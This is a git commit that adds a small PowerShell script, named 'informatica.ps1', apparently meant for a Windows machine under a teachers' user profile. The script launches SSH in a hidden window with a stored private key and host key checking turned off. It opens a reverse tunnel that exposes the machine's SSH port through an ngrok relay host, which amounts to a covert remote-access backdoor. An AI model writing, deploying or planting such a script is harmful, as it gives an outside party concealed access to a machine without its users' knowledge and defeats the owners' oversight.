4025e25d8b3cf71209260dabcb9791bd7f18ddb0
usermants <sanchezguy@proton.me>
2025-10-02 18:26:17 -0300

    Create informatica.ps1

---
+++ informatica.ps1
@@ -0,0 +1,11 @@
+# Caminho do SSH
+$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
+
+# Caminho da chave privada
+$keyPath = "C:\Users\Professores 2\.ssh\ssh_key"
+
+# Argumentos da conexão SSH
+$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 3333:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 16156 -N -vvv"
+
+# Executa o SSH de forma invisível
+Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
